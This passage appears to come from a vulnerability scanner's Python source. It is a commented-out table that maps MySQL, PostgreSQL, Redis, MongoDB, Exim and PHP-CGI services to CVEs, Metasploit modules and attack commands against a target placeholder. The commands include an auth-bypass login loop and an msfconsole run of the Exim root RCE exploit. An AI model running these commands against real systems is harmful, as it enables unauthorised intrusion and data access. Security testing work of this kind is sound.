#         "metasploit": "auxiliary/scanner/mysql/mysql_authbypass_hashdump",
#         "exploit_db": "19092",
#         "command": "for i in $(seq 1 1000); do mysql -u root --password=bad -h {target} 2>/dev/null && break; done",
#         "description": "MySQL 5.x on certain platforms allows login bypass due to improper cast comparison (~1 in 256 chance per attempt).",
#     },
#     {
#         "service_re": r"postgres",
#         "severity": "MEDIUM",
#         "cve": "",
#         "title": "PostgreSQL — test default credentials",
#         "metasploit": "auxiliary/scanner/postgres/postgres_login",
#         "exploit_db": "",
#         "command": "psql -h {target} -U postgres -W",
#         "description": "PostgreSQL may have default or weak credentials. Test postgres:postgres, postgres:(empty).",
#     },
#     {
#         "service_re": r"redis",
#         "severity": "HIGH",
#         "cve": "",
#         "title": "Redis — unauthenticated access",
#         "metasploit": "",
#         "exploit_db": "",
#         "command": "redis-cli -h {target} INFO",
#         "description": "Redis without authentication allows full data access and may enable RCE via SLAVEOF or module loading.",
#     },
#     {
#         "service_re": r"mongo",
#         "severity": "HIGH",
#         "cve": "",
#         "title": "MongoDB — unauthenticated access",
#         "metasploit": "",
#         "exploit_db": "",
#         "command": "mongosh --host {target} --eval 'db.adminCommand({listDatabases:1})'",
#         "description": "MongoDB without authentication allows full database access. Enumerate all databases.",
#     },
#     # ── Mail ──────────────────────────────────────────────────────────
#     {
#         "service_re": r"exim\s+4\.(8[0-7])",
#         "severity": "CRITICAL",
#         "cve": "CVE-2019-10149",
#         "title": "Exim 4.87-4.91 RCE (The Return of the WIZard)",
#         "metasploit": "exploit/unix/smtp/exim4_string_format",
#         "exploit_db": "46974",
#         "command": "msfconsole -q -x 'use exploit/unix/smtp/exim4_string_format; set RHOSTS {target}; run'",
#         "description": "Exim 4.87 through 4.91 allows remote code execution as root via crafted RCPT TO command.",
#     },
#     # ── PHP / CGI ─────────────────────────────────────────────────────
#     {
#         "service_re": r"php.*(5\.[0-3]|4\.)",
#         "severity": "HIGH",
#         "cve": "CVE-2012-1823",
#         "title": "PHP-CGI Argument Injection RCE",
#         "metasploit": "exploit/multi/http/php_cgi_arg_injection",
#         "exploit_db": "18836",
#         "command": "curl 'http://{target}/?-s' | head",
#         "description": "PHP in CGI mode allows argument injection enabling source code disclosure and remote code execution.",
#     },
# ]
_KNOWN_VULNS = []  # KB disabled — let the model derive CVEs from NVD + RAG
